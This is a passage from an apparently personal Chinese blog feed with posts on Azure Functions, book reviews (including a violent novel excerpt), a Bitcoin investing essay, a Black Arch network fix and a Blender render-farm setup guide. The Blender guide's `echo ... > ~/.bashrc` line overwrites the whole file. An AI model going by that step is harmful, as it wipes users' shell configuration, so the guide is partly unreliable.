<span class="built_in">console</span>.log(rowCount + <span class="string">&#x27; row(s) returned&#x27;</span>);</span><br><span class="line">            process.exit();</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    request.on(<span class="string">&#x27;row&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">columns</span>) </span>&#123;</span><br><span class="line">        columns.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">column</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;%s\t%s&quot;</span>, column.metadata.colName, column.value);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    connection.execSql(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那个process.exit()是几个意思？</p>
<p>代码修葺中。。。。。</p>
<p>发布函数很简单，直接在VsCode里操作插件就好了。但是上传一个函数，我得想三个到四个名字。一个Azure Function的名字，一个Resource Group的名字，一个Storage Group（我也不知道这个干嘛的）名字，还有一个Function App名字。起这些名字才是最纠结的时候。毕竟我都不知道这些名字都用在什么地方。</p>
<p>最后一步是处理云端中函数的执行环境。打开Portal里的Kudu。在Debug Console里进入程序目录，执行<code>npm install</code>。网页的终端真的是卡的不要不要的。安装个NPM，连安装时候的Output都显示不出来。让我真的是摸不着脑袋，鬼知道有没有安装成功。</p>
<p>简单来说使用经历不是那么喜人，算然VsCode的兼容很好，但很多时候都显得操作冗余。对于个人开发者来说，Azure价格要高一些，又显得较为麻烦，并不会是我的第一选择。再之，网上教程还不多，还有那个令人讨厌的Portal。一眼望去，满屏的滚动条，甚至两行的滚动条。 <!-- <center><img class="lazyload" data-src="/static/images/azure2.png"></center> --></p>
<p>下次我肯定选LeanCloud或者Firebase。</p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Cloud</tag>
        <tag>Azure</tag>
      </tags>
  </entry>
  <entry>
    <title>数学之美-吴军</title>
    <url>/posts/c2f73a5/</url>
    <content><![CDATA[<p>数学之美讲述的更多的是数学的应用，而不是数学本身的美丽。 <a id="more"></a> 数学之美本来是刊登在谷歌黑板报上用以科普谷歌技术的，后来被作者吴军整理成了书。</p>
<p>整本书更多的是介绍谷歌所使用的自然语言处理技术以及搜索及排序技术。大部分书中谈论的都是为搜索服务的，这也符合了谷歌起家的基础。</p>
<p>为了触及到更广泛的读者，数学之美这本书中对这些工程实现之后的数学有所涉及，但并不够详尽。大部分的数学原理都被浓缩在那正章之后几页的扩展阅读里，因此读完这本书只是让我对于语言处理领域大家在使用什么技术有了一个大概的印象。更多的东西需要我去书后的文献中去寻找。接下来是一些我觉得比较有意思，可以仔细看看的话题：</p>
<ul>
<li>马尔科夫链</li>
<li>隐含马尔科夫模型</li>
<li>古德-图灵估计 Good-Turing Estimate</li>
<li>鲍姆-韦尔奇 Baum-Welch Algorithm（马尔可夫链的无监督训练方式）</li>
<li>通信的数学原理（A Mathematical Theory of Communication)</li>
<li>信息熵</li>
<li>最大熵模型（The Maximum Entropy Principle）</li>
<li>通用迭代算法GIS（Generalized Iterative Scaling）</li>
<li>改进迭代算法IIS（Improved Iterative Scaling）</li>
<li>最大熵模型快速算法</li>
<li>Logical Regression</li>
<li>期望值最大化算法</li>
<li>维特比算法</li>
<li>欧拉七桥问题</li>
<li>逆向文档频率 TF-IDF</li>
<li>Map-Reduce</li>
<li>奇异值分解</li>
<li>稀疏矩阵</li>
<li>贝叶斯网</li>
<li>蒙特卡罗（Monte Carlo）</li>
<li>条件随机场</li>
<li>梯度下降（Gradient Descent）</li>
</ul>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>The Big Question 读后感</title>
    <url>/posts/21e4ae63/</url>
    <content><![CDATA[<p>The Big Question: A short introduction to Philosophy, 9th edition. Robert C. Solomon + Kathleen M. Higgins <a id="more"></a></p>
<p>这是一本很不错的哲学入门书籍，挺厚的五百多页。 我大概去年暑假末买的这本书。到现在，我陆陆续续花了一年时间读完了这本书。是时候写一下我的感受。但是我并没有吃透整本书，整本书的信息量很大，难度也不小，因此我就不过多陈述这本书的内容了。</p>
<p>整本书一共分为十一章：哲学问题，生活的意义，实在的本性，真理的追寻，自我，自由，道德和好的生活，正义和好的社会，非西方哲学，美；以及附录里还有一些与逻辑，论证，写作哲学有关的一些东西。</p>
<p>整本书的内容由浅入深，从道德那一章开始，我就觉得整本书变得更加难懂。所讨论的问题的确还是日常的问题，但并不是我日常所思考的问题。整章会给我抽象的感觉。读书的速度越来越慢，看书令我感觉越来越困。读完整本书真的挺艰难的。</p>
<p>每章的结构和论证都是挺清楚的。首先会有个导言，引发你对那个话题的思考。接着是对这个话题的解释，以及哲学史上不同哲学家的观点。在每一章的最后，是篇末思考题-是一些需要读者思考的问题。之后便是贴心的阅读建议。上面是满满的各种哲学家关于这个话题的著作。</p>
<p>读完这本书，了解了更多的哲学家：休谟，康德等等。对于一些原本稀疏平常的问题，有了更深刻的思考。我的逻辑变的更加的清楚，理性变得更加的强。这些都是这本书给我带来的帮助。</p>
顺带一提，暑假开始了。我真的是懒得干活了。
<hr>
<center>
<img class="lazyload" data-src="/static/images/bigquestion-gift.jpg">
</center>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
        <tag>Philosophy</tag>
      </tags>
  </entry>
  <entry>
    <title>Black Archlinux无法上网</title>
    <url>/posts/f4f47d87/</url>
    <content><![CDATA[<p>想继续用Archlinxu，但是又需要一个有渗透软件的OS。那就是Black Arch了。 <a id="more"></a> 我在VMware虚拟机中，加载iso启动后，发现无法上网。我的VMware的网络设置是Nat模式。 以下是解决方法。 <figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">systemctl enable dhcpcd@<span class="module-access"><span class="module"><span class="identifier">VMnet8</span>.</span></span>service </span><br><span class="line">systemctl start dhcpcd@<span class="module-access"><span class="module"><span class="identifier">VMnet8</span>.</span></span>service</span><br></pre></td></tr></table></figure> 问题应该在于Dhcpcd服务没有开启。因为是虚拟机，所以网卡并不是默认的网卡，而是Vmnet8的网卡。</p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Archlinux</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Bitcoin</title>
    <url>/posts/197cebf2/</url>
    <content><![CDATA[<p>我对投资的理解从比特币开始。 记住：风险和收益是并存的 <a id="more"></a></p>
<h2 id="x01-current-situation">0x01 current situation</h2>
<p>比特币在昨天突破了七千美元，并且全球最大期货交易所芝加哥交易所计划推出比特币期货。这意味着比特币的地位将和原油与黄金一样。</p>
<p>所以在这个时候，我写下这篇文章来分享我的经历。 <img data-src="/static/images/bitcoin1.png" alt="比特币价格" /></p>
<figure>
<img data-src="/static/images/bitcoin2.png" alt="比特币价格" /><figcaption aria-hidden="true">比特币价格</figcaption>
</figure>
<h2 id="x02-what-is-bitcoin">0x02 what is bitcoin</h2>
<center>
<img class="lazyload" data-src="/static/images/bitcoin3.png" height="30%" width="30%">
</center>
<p>简单来说，比特币是一个去中心化的加密货币。</p>
<p>那么为什么现在有这么多人开始关注比特币呢？因为比特币的疯涨激发了人性的贪婪。大多数人都想从中<strong>毫无风险</strong>的大大捞上一笔。</p>
<p>让我们看看比特币从最初到现在的k线图</p>
<center>
<img class="lazyload" data-src="/static/images/bitcoin4.png" height="100%" width="100%">
</center>
<p>比特币是世界上第一个，也是现在市值最大的区块链(区块链我会在下一个章节详细讲)，市值大约为117,685,783,828.40美元-<strong>一千亿美元</strong>。24小时的成交量为4,284,443,856.81美元-<strong>四十亿美元</strong>。它由一个昵称为中本聪的人在2009年开发。</p>
<p>比特币就像一家世界银行，只不过它不属于任何权威管辖，它由一个去中心的网络构成。拥有与去中心化特性相对的货币便是法币(像人民币，美元之类的)</p>
<h2 id="x03-what-is-blockchian">0x03 what is blockchian</h2>
<p>区块链便是比特币背后的技术。具体来说，区块链是一种公开的，由去中心化网络维护的账本。这个账本的基本组成元素便是一个个区块。<strong>区块链是一种去中心化的技术，但不代表着去中心化。</strong> 例如政府想要发行国家代币，那么虽然区块链拥有许多的节点，但是这些节点都是由政府所控制的，因此并不意味着绝对的去中心化，但是却要比把所有数据都储存在一个服务器中更加去中心化。</p>
<p>区块链最重要的两个特性便是：<strong>开放</strong>，<strong>不可篡改</strong>。</p>
<p><strong>开放</strong>指的是任何人都可以访问区块链上的数据，清楚的看到账本的每一个比特。<strong>不可篡改</strong>指的是没有任何人可以更改区块链上已经存在的数据。</p>
<p>这两个特性产生了我所认为的区块链最大的创新-廉价的产生信任。众所周知，信任是现代经济的基础，它被广泛应用在信用卡，贷款，货币等金融工具上。</p>
<p>国家之所以能发行货币，便是因为货币的价值由国家所担保。法定货币的本质便是人们对于一个国家的信任。没有人愿意相信一个风雨飘摇中的国家，例如正在经历恶性通货膨胀的津巴布韦。</p>
<p>然而区块链带来一种全新的生产信任的方式。信任不再是大企业，国家的专属用品。区块链的信条是<strong>code is the law</strong>。它的规则是由冰冷冷的代码所制定并由计算机所执行的。人们相信区块链，实则是相信区块链的代码。再基础一点，是一些数学原理保证了代码的可靠性。因此人们对于区块链的信任实际上来源于对于数学的信任。那现在的普通人如何被别人相信呢？很简单，利用区块链。任何人都可以基于区块链来编写属于自己的智能合约。这样他人对自己的信任便被转移成为他人对区块链，数学的信任。我相信大多数人都是数学的铁杆粉丝。因此我认为区块链最大的创新便是在于赋予了人们一种廉价的大量制造信用的方式，它打破了政府以及大企业长期对于信用的垄断。</p>
<h2 id="x04-what-is-ico">0x04 what is ICO</h2>
<p>ICO 是 Initial Coin Offering 的缩写，是区块链公司向公众募集资金的一种方式，<strong>有点</strong>类似于股票市场上的 IPO。</p>
<p>参加IPO，参与者获得的是具有法律效益的股权。参加ICO，参与者获得的是代币。看起来代币没有任何法律效益，但是代币却比股权更加珍贵。因为代币代表的是公司的一切。如果大家都不喜欢这家公司，都选择抛售这家公司的代币，那么很快这家公司的代币便会归零。这家公司会陷入资金困难。</p>
<h2 id="x05-what-is-ifo">0x05 what is IFO</h2>
<p>Bitpie最近新推除了一个服务叫IFO（initial fork offering)，帮助客户做硬分叉的。</p>
<p>第一次硬分叉发生在比特币决定进行segwit2X升级，吴忌寒为了利益，选择了对比特币进行硬分叉。形象些说，硬分叉便是从比特币这颗大树上长出一根树枝的过程。<strong>分叉后的币与比特币将没有任何关系</strong>吴忌寒将分叉出来的币叫bcc。之后又有其他人对比特币进行了几次分叉-bcd，bcg。对于用户来说，每次分叉都可以领一次糖果。例如我有1.5个比特币，那么比特币进行硬分叉后。我便可以自动获得1.5个分叉出来的货币。可以说是天上掉钱了。</p>
<h2 id="x06-bitcoin-and-me">0x06 Bitcoin and me</h2>
<p>第一次知道比特币是在2017年的4月。同学跟我讲起几乎暗网上所有的黑市是用比特币进行交易。在那之后我逛了一圈黑市，的确黑市所有商贩都接受比特币付款。一般黑市主页上也会实时显示着比特币与美元的汇率。那时候比特币的价格是九千到一万人民币左右。</p>
<p>真正买入比特币是在五月中旬。刚买进的时候，我什么都不懂，甚至连k线也看不懂。令我感到庆幸的是我选择的交易网站有新手教程，它教会了我如何看懂k线图的含义。在那个时候比特币的价格走势总是忽上忽下，有时会出现一天百分之二三十的涨幅。这也导致了我很焦虑，整天跟坐过山车似的。天天盯着k线图，总是梦想着短期套利(现在想想，那时候真的是异想天开)，却从来也没有成功过。那时候的我心情浮躁，天天想着挣钱，极度缺乏耐心。心情的波动也是与比特币的价格波动同步的。真的是一个 <strong>嫩韭菜</strong> 。</p>
<p>读了更多的币圈中名人的文章，看过更多关于区块链的技术性文章，甚至自己动手尝试了区块链(也只启动了几个node，连智能合约都没有写过)。在加密货币巨大的波动中，我逐渐褪变成为了更加理性的老韭菜，再也不追涨杀跌，心情变得沉稳下来。在这段时间里我也参加了几次ICO。ICO的领域中充满了投机的气氛。投资者大都梦想着代币在发行后翻个几十倍（的确有这样的情况发生）。静下心来想一想，我所希望得到的是可以以参与者的身份，加入区块链革命当中去，而不只是一个旁观者。</p>
<p>这段时间里，我主要学习的是投资，如何投资未来。老猫的文章在<a href="http://chuansong.me/n/1813151252503">不确定性</a>，<a href="http://chuansong.me/n/1522063452851">区块链信仰</a>，如何评估属于未来的产品方面给了我很大的启发。尤其是对于新事物要敢于尝试。他说：“对于自己熟悉的方面，应该先思考再行动；对于自己陌生的方面，应该先行动再思考(因为错过了，可能后悔的是一辈子；并且学习新的事物，踩到坑是无法避免的)”</p>
<h2 id="x07-我对比特币的看法">0x07 我对比特币的看法</h2>
<p>比特币是属于互联网的产物，但是我更认为它会掀起320年来的一次经济革命。</p>
<p>首先，人类之所以比动物优秀，那是因为人类会合作，并且人类的群落要比动物大的多。在自然条件下，一个群落最多包含一百五十个人。这种情况下，人们通过八卦来互相了解。随着群落人数的增加，人们想出了新的方法来维持群落的稳定。这个方法体现了人与动物另一个不同的地方-想象力。人们创造了宗教，国家这样虚拟的概念来维持着群落。群落的人数越来越多。这个从实体向虚拟的变化带给了人们莫大的进步。</p>
<p>货币也是这样。随着经济的发展，人类一开始使用的货币是一些实体，例如贝壳，黄金。后来人类开始使用一些象征物，由政府赋予它们价值-法币。法币的实际意义是由一个<strong>虚拟</strong>的概念-国家所赋予的，但是它却拥有实体-纸钞。然而数字货币更进一步，它是虚拟的，它无处不在，可以将全世界连接起来。这样一个将人类优势发挥到极致的货币，我相信它的潜力是无穷的，它将标志着下一个时代的开始。</p>
<p>回到现在，那为什么中国要禁止比特币呢？这其实跟中国的外汇管制政策是相关的，都是为了防止人民币外流。中国的M2系数，自2000年开始，达到了年均14%的涨幅，并且人民币汇率也在一直攀升。2016年的M2系数接近160万亿，2000年只是13.2万亿。将这印钞机印出来的150万亿换成美元便是25万亿，足够买下美国股市-几乎是整个世界的上市公司。看上去中国梦指日可待。</p>
<p>然而央行只有3万亿美元的美元储备，折合人民币十八万亿。想拿着150万亿人民币去世界上买买买？央行上哪里给你兑换美元？</p>
<p>其实对于国家来说，3万亿的美元储备才是可以在国际上花的钱，国内的160万亿都只是纸。如果多出来的人民币全跑到国外了，人民币将会恶性贬值。所以只能外汇管制。</p>
<p>所以央行是这样规定的”<strong>禁止作为央行的对手方买卖代币</strong>“</p>
<p>谨记7000美刀的比特币。</p>
<h2 id="x08-结语">0x08 结语</h2>
<p>现在，我还是看不懂k线走势，没有能力做短期。我拥有的只是一些投资未来的能力和一颗沉着冷静的老韭菜的心。明年我一定要自己动手写一个智能合约，感受一把“code is the law”。</p>
<p><strong>LONG BITCOIN, SHORT THE WORLD!</strong></p>
参考 <a href="https://github.com/xiaolai/INB-Principles/blob/master/Chinese.md">开源区块链投资原则 by 李笑来</a> <em>就是那个著有托福21天突破的人，他可是币圈名人。他学习的脚步从来都没有停过。<a href="http://lixiaolai.com/">博客传送门</a>(p.s.他的博客和我的博客是同一个框架)</em>
<div data-align="right">
第二次修改于比特币10700美元。
</div>
<hr>
<figure>
<img data-src="/static/images/bitcoin11.jpg" alt="have fun" /><figcaption aria-hidden="true">have fun</figcaption>
</figure>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Cryptocurrency</tag>
        <tag>Investment</tag>
      </tags>
  </entry>
  <entry>
    <title>不哭不哭，痛痛飞走吧</title>
    <url>/posts/cd65f7c1/</url>
    <content><![CDATA[<p>本来我是很少看青春小说的，但是要给同学挑礼物啊。想了想，还是送本青春小说最实在。如果随意百度一个榜单，随便挑一本送给别人，未免太没有诚意了。那么只好我亲自挑选了。第一本是《三日间的幸福》，第二本是来自相同作者的《不哭不哭，痛痛飞走吧》 <a id="more"></a></p>
<p>说实话，这两本书虽然在剧情构思上有一些类似，人设上有一些共鸣，但风格完全不太对啊。《三日间对幸福》所透露出的是在绝望的尽头那一丝平淡的幸福。而《不哭不哭，痛痛飞走吧》风格和主旨有了一定的变化。相比起上一部对于爱情的关注，这一部给我更加专注于校园欺凌和家庭暴力的感觉。口味也变的重了起来，书中有对血腥场景的描述。这突变对风格着实惊讶到了我。</p>
<p>剧情相较于上一部，也不再那么容易猜测，总算是有一点悬念了。途中埋下的伏笔倒是感觉有一些不够，毕竟最后那个结局可是妥妥的出人意料啊。最为明显的暗示便是明明穿着高中校服的女孩子为什么会是以前和自己同龄的女孩子。我从这个暗示中也猜不出什么。相比上一部，剧情更加的魔幻，便显得很难打动读者。当然了，男主与青春期孩子还是有一定共鸣的，只是也没有上一部那么强啊。这一部的男主，瑞穗也是比楠木先生更加颓废的样子啊。瑞穗是对未来都不曾抱有希望，对于任何事情都没有热情。</p>
<p>书中还有几个配角，进藤-男主的好友。也是一个对生活毫无热情的人，最后自杀了。进藤曾是瑞穗的精神支柱。看到比自己还颓废的进藤也在努力的活着，瑞穗才勇敢的生活下去。还有一个人便是隔壁的艺大生。文中并没有对艺大生的背景做过多的介绍，只是隐约的提到她和进藤似乎有什么关系。艺大生在作品中是一个推进剧情的人物，总是在关键时候指点男主。她很容易就接受了男主是杀人犯的事情，并为此嘲笑他的处境。但是相较于虚伪的安慰，男主更喜欢这样真实的嘲讽。有时候，心灵鸡汤真的对一些人只能起到反面作用。</p>
<p>剧情的节奏我个人感觉还是有一些奇怪的，前面所讲述的是杀人犯先生和被害人小姐一起杀人的事情。随着细节逐渐的积累，被害人小姐也是发现了杀人犯先生与自己过去的羁绊。杀人犯先生也是逐渐明悟了自己对被害人小姐对情感。在结局，作者一连揭晓两个三个谜题，并以被害人小姐的视角讲述了原本的故事。男主变得对生活毫无兴趣的原因或许有一部分便是被害人小姐的能力所导致的。</p>
<p>但是啊，结果他们还是相遇了。原来的原来，是男主死了。但是现在呐，是杀人犯先生撞死了被害人小姐。他们以令人惊讶的方式相遇。总感觉好巧呢。</p>
<p>比较有意思的是，杀人犯先生带着被害人小姐去买衣服的时候，店家将他们认成兄妹。在杀人犯先生帮助了被害人小姐一段时间后，再一次走进一家店，店家觉得他们是千金大小姐带着自己的侍从。从一开始的关怀，到之后的无条件的帮助，这也是态度的变化吧。</p>
<p>到底是什么时候被害人小姐发现了杀人犯先生与自己的羁绊呢？是那句咒语吗，‘不哭不哭，痛痛飞走吧’。</p>
<p>我印象最深的场景是，杀人犯先生拿着被害人小姐的凶器，那把剪刀。眼神逐渐变的凶残起来，或许被害人小姐身上有着吸引别人欺凌她的气质。“咚”，烟灰缸砸中了杀人犯先生的额头。杀人犯先生的眼神变回了正常。被害人小姐却在那感到愧疚。</p>
<blockquote><p>我坐到少女的正前方，就像她先前一样，将剪刀举到眼前端详 。本以为刀刃已经磨得像镜子一样亮晶晶的，却也不是这样 。从几公分的距离看去，刀面上有着无数细小的痕迹 。这也难怪，因为重要的是刀尖能不能毫无阻碍地穿破皮肉，磨利其他部分也只会降低刀刃的强度 。我想少女应该只是把最妨碍插人的刀尖的铁锈给磨平了而已——不过剪刀生锈也不过是我想像中的情形罢了 。</p>
<p>「磨得真好......」我自言自语。</p>
<p>听说人一拿起工具，就无法不去想象使用工具的自己，看着这把专门用来杀人的剪刀，我突然产生了一股冲动，也想拿起这把剪刀刺人，磨得非常锐利的刀尖，多半会像刺进熟透的果肉一样，轻而易举地刺进肉里</p>
<p>我试着想象。我想拿着这把剪刀刺人，那么我该刺谁好呢？</p>
<p>最先列入候选名单的，终究是坐在隔壁床上的这个心浮气躁、目光始终注视着离开手边的剪刀的少女。</p>
<p>看来这把裁缝剪刀和布偶一样，对她发挥了镇定剂的作用。他本人大概也是到现在才知道，一旦离开剪刀，就会因为无助而产生动摇，却又不想承认而装作若无其事。看来是这么回事。</p>
<p>失去武器的现在，少女变得几近无力 。我想像着如果当场刺死她，会演变成什么情形 。如果把剪刀插进她那光泽柔和的睡衣缝隙间微微露出的美妙春光上、如果割开她那会发出有如玻璃竖琴一般，纯净怡人的嗓音的喉咙、如果刺进她那几乎没有任何脂肪的光洁的小腹后扭动刀柄旋转。</p>
<p>少女的杀意似乎透过刀传染到我身上来了 。</p>
<p>我把食指伸进握环，转动剪刀 。</p>
<p>少女不耐烦地伸出手说:「还给我 。」</p>
<p>但我没有回应她，脑海里还在回味自己残暴想象带来的快感。</p>
<p>就在我决定她再说两次「还给我」后就还给她时，少女的眼神已经变了 。不，或许应该说是转为混浊了 。</p>
<p>我对这个表情很熟悉，这是她与复仇对象对峙时的表情 。</p>
<p>我突然感受到一阵坚硬的冲击，眼前一白，整个人往后倒在床上 。眉心传来一阵像要裂开似的剧痛 。飘散在脸上的灰尽气味，让我知道自己是被烟灰缸砸中 。左手感觉得出剪刀被抢走 。我担心剪刀在下一瞬间就会对准我，但所幸并未发生这种情形 。</p>
<p>我痛得好一会儿不能动弹，然后坐起上身，拍掉衬衫胸口的灰烬 。我用指尖轻轻摸了摸，想知道额头现在的情形，就摸到一些浓稠的血，但我这两天来已经看血看到腻了，所以也没什么感觉，顶多只因为弄脏手而觉得不快 。我将手指凑到鼻子前，闻了闻这像是铁锈般的气味，然后捡起掉在地上的烟灰缸，放回小桌子上 。</p>
<p>少女背向我，坐在自己的床上 。</p>
<p>刚才的醉意已经散去 。</p>
<p>我拿自己没辙，觉得真受不了自己 。</p>
<p>我自认很冷静，但看来这几天来这几天来的种种事情，已经着实地让我渐渐失去了理智 。</p>
<p>我以为自己惹她生气了 。但当我正要为自己恶劣的玩笑道歉而拍了拍少女的肩膀时，她却害怕地缩起身体 。</p>
<p>她回过头来，脸颊上有泪划过。</p>
<p>看来她的心灵远比我想像中的更加脆弱 。</p>
<p>她大概是从我拿着剪刀露出诡异笑容的模样中，看到了那些虐待她的家伙的影子吧。</p>
<p>少女知道我不会反击后，低下头轻声说:</p>
<p>「……请你再也不要做这种事了。」</p>
</blockquote>
<p>但是少女哭的原因似乎不是这么简单呢，回忆才是容易打动人的地方。</p>
<p>少女的能够取消的设定也是挺有意思的。当男主问少女为什么要执着于复仇的时候，少女说她虽然可以取消伤痕，但是心中的创伤可是无法取消的呢。</p>
并不想过多的剧透剧情，所以人称代词就是这么怪怪的。书的简介就是大大的欺骗二字。那个的确是小说的开头，但是那不是小说的重点啊。
<hr>
<center>
<img class="lazyload" data-src="/static/images/bkbkttfb.jpg" height="80%" width="80%">
</center>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>自建 Blender Render Farm</title>
    <url>/posts/7a296127/</url>
    <content><![CDATA[<p>暂时没打算买新显卡，那渲染慢怎么办？云渲染！</p>
<a id="more"></a>
<h1 id="为什么要自建云渲染">为什么要自建云渲染</h1>
<p>由于本地算力不够，或者单纯想要加快渲染速度，云渲染都是首选。一般的云渲染是使用现成的渲染农场，但是它价格偏高。如果可以使用多个 VPS 进行渲染，成本会比直接使用渲染农场低很多，除了 VPS 比较便宜，很多 VPS 供应商对新账号都会提供代金券。如果我们使用新账号进行云渲染，成本可以进一步被降低。</p>
<h1 id="配置渲染节点">配置渲染节点</h1>
<p>我们使用 <a href="https://www.crowd-render.com/">CrowdRender</a> 来管理渲染节点。本地的安装和使用直接看官网教程。我着重解释一下如何配置 VPS 。</p>
<p>首先我们需要安装最新版本的 Blender。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade -y</span><br><span class="line">sudo apt-get install wget -y</span><br><span class="line">sudo apt-get install python3-pip -y</span><br><span class="line">sudo snap install blender --classic</span><br><span class="line">echo <span class="string">&#x27;export PATH=/snap/bin:$PATH&#x27;</span>&gt; ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure> 我们需要将 Crowdrender 插件上传到 VPS 上。我们可以使用 Winscp 进行上传。上传 ZIP 文件即可，不需要解压。</p>
<p>假设我们将 Crowdrender 上传到了<code>/root/cr.zip</code></p>
<p>接下来便是开启插件。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blender -b --python-console</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bpy</span><br><span class="line">bpy.ops.preferences.addon_install(filepath=<span class="string">&#x27;/root/cr.zip&#x27;</span>)</span><br><span class="line">bpy.ops.preferences.addon_enable(module=<span class="string">&#x27;crowdrender&#x27;</span>)</span><br><span class="line">bpy.ops.wm.save_userpref()</span><br></pre></td></tr></table></figure> <strong>或者</strong>将这一块代码放入<code>enableaddon.py</code>，并用 Blender 执行。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bpy</span><br><span class="line">bpy.ops.preferences.addon_install(filepath=<span class="string">&#x27;/root/cr.zip&#x27;</span>)</span><br><span class="line">bpy.ops.preferences.addon_enable(module=<span class="string">&#x27;crowdrender&#x27;</span>)</span><br><span class="line">bpy.ops.wm.save_userpref()</span><br></pre></td></tr></table></figure> 然后用 blender 执行刚刚创建的脚本。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blender -b -P enableaddon.py</span><br></pre></td></tr></table></figure> 接下来便是启动渲染服务。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blender -b -P ~/.config/blender/<span class="number">2.83</span>/scripts/addons/crowdrender/src/py_3_7/serv_int_start.py -- -t <span class="string">&quot;server_int_proc&quot;</span></span><br></pre></td></tr></table></figure> # 局限 在完成渲染节点的设置后，我们只需要将节点的 IP 地址输入本地的插件中进行连接和同步即可。这个插件的连接是有点慢的。点了铁链图表要过了很久才会弹出选框。</p>
<p>目前已知的局限性为流体的渲染有点困难，除非你将所有的缓存和烘焙数据同步上去。</p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Blender</tag>
        <tag>Render Farm</tag>
        <tag>渲染农场</tag>
        <tag>云渲染</tag>
      </tags>
  </entry>
  <entry>
    <title>从哪儿寻找新的区块链项目？</title>
    <url>/posts/5b7ede32/</url>
    <content><![CDATA[<p>人间一天，币圈一年。这些新项目我们应该去哪里找呢？ <a id="more"></a></p>
<p><a href="https://github.com/w3f/General-Grants-Program/blob/master/grants/accepted_grant_applications.md">Web3 基金会</a>也会定期放出他们资助的项目。 <a href="https://esp.ethereum.foundation/en/projects/">Ethereum 基金会</a>：在它的<a href="https://blog.ethereum.org/category/ecosystem-support-program/">Blog</a>中可以看到最近受到资助的项目。</p>
<h1 id="风投机构">风投机构</h1>
<p>可以在 Crunchbase 上订阅他们。</p>
<p>Dragonfly Capital 投资了很多区块链项目，团队成员以中国人为主，主管是冯波。在<a href="https://www.dcp.capital/portfolio">它的投资列表</a>中可以找到很多熟悉的项目。在<a href="https://medium.com/dragonfly-research">Dragonfly Capital 的研报</a>中可以看见他们投资的新项目。 https://pic1.zhimg.com/80/v2-a6527926ff86de682628f686bb2d20ec_720w.jpg</p>
<p>#HASHED 是一个来自韩国的风投机构，关注亚洲和美国的区块链项目。<a href="https://www.hashed.com/portfolio">他们主要投资</a>区块链平台，金融基础设施和应用。<a href="https://www.hashed.com/content">在这</a>可以发现他们的最新动态。</p>
<p><a href="https://dekrypt.capital/">dekrypt capital</a></p>
<p><a href="https://lemniscap.com/portfolio">Lemniscap</a>。<a href="https://medium.com/lemniscap">他们的 Blog。</a></p>
<p>FBG Capital</p>
<p><a href="https://www.astronaut.capital/#What%20we%20do">Astronaut Capital</a></p>
<p><a href="https://www.placeholder.vc/">Placeholder</a></p>
<p>Picolo Research 聚合了各种区块链项目并且提供调研报告。</p>
<p><a href="https://cryptofundintelligence.com/">Cryptofund</a>提供各种加密货币基金。</p>
<p>Dekrypt Capital 专注于投资区块链基础设施</p>
<p><a href="https://ventures.coinbase.com/">Coinbase 风投</a></p>
<p><a href="https://www.ideocolab.com/ventures/">Ideocolab 风投</a></p>
<p><a href="https://blockchain.capital/portfolio/">Blockchain Capital</a></p>
<p><a href="https://www.panteracapital.com/portfolio">Pantera Capital</a></p>
<p><a href="http://consensus-lab.com/">共识实验室</a>提供基金月报。</p>
<center>
<img class="lazyload" data-src="/static/images/blockchainProject.png" height="80%" width="80%">
</center>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>静态博客优化</title>
    <url>/posts/7a4bc632/</url>
    <content><![CDATA[<p>新的一年从优化博客开始。这一次从内容，性能这两方面对博客进行优化。</p>
<a id="more"></a>
<blockquote>
<p>BBC 发现其网站的加载时间每增加一秒，便会多失去 10% 的用户。 DoubleClick by Google 发现，如果页面加载时间超过 3 秒，53% 的移动网站访问活动将遭到抛弃。</p>
</blockquote>
<p>网站的加载时间直接关系到网站的访问量。我们可以提升网站的加载速度。比如优化代码，减少脚本数量，提升网站响应速度等等。这些提升网站加载速度的方法都比较硬核，需要一定的开发功底。比如想要优化代码，但是一个博客的主题代码量可不少，到底从哪着手优化呢？除了从理论上提升网站的加载速度，我们也可以减少用户感知到的等待时间。比如把重要的内容先加载了，不重要的东西之后加载。又或者对图片采用懒加载的方式。等图片进入窗口时，再进行加载。</p>
<h2 id="背景">背景</h2>
<p>我的博客基于Hexo，托管在<a href="netlify.com">Netlify</a>上，Theme是<a href="https://github.com/bolnh/hexo-theme-material">hexo-theme-material</a>。几年前，这个Material Theme是Hexo社区最火的Material主题。但在2018年，仓库的拥有者消失了。拥有者消失之后，核心开发者也没有对项目进行后续的维护和开发。到了现在，托管项目文档的网站也打不开了。也不知道这个我还能再用这个主题几年。</p>
<h2 id="准则">准则</h2>
<p>性能优化这个词很大。但到底从哪里开始优化呢？ 我个人使用Google的<a href="https://developers.google.com/speed/pagespeed/insights/">PageSpeed Insights</a>进行扫描。PageSpeed Insights的报告会显示网站的性能并且会给出建议。接着我就按照这些建议对网站进行优化。</p>
